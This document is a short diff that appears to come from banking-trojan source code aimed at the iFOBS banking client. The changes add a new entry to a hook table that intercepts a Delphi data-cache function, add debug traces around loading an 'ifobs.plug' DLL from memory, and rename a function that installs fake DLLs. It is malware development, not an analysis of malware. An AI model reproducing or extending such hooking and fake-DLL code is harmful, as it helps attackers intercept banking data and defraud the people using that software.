@@ -74,6 +74,7 @@ static HookFunc funcsPlug[] =
 	{ "vcl70.bpl", "HProc4", 0x8D55F8B4, "TCustomFormShow" },
 	{ "vcl70.bpl", "HProc5", 0x3DF02899, "TCustomFormCloseQuery" },
 	{ "RtlStore.bpl", "HProc6", 0xCF6CD66, "GlobalAppStorage" },
+	{ "RtlData1.bpl", "HProc7", 0xAFD2F1E2, "FillDataToDBCache" },
 	{ 0 }
 };
 
@@ -441,10 +442,13 @@ static bool InitPlugin()
 	bool ret = false;
 	DWORD sizeIfobsPlug = 0;
 	BYTE* dataIFobsPlug = GetPlugin( "ifobs.plug", sizeIfobsPlug );
+	DBG( "IFobs", "1" );
 	TMemoryDLL ifobsPlug(dataIFobsPlug);
+	DBG( "IFobs", "2" );
 	ifobsPlug.SetNotFree();
 
 	PInitFunc InitFunc = (PInitFunc)ifobsPlug.GetProcAddress("InitFunc");
+	DBG( "IFobs", "3" );
 	if( InitFunc )
 	{
 		DBG( "IFobs", "есть InitFunc" );
@@ -696,7 +700,7 @@ void CreateFileReplacing( const char* s )
 
 
 
-DWORD WINAPI IntallFakeDll(void*)
+DWORD WINAPI InstallFakeDll(void*)
 {
 	const char* dlls[] =
 	{
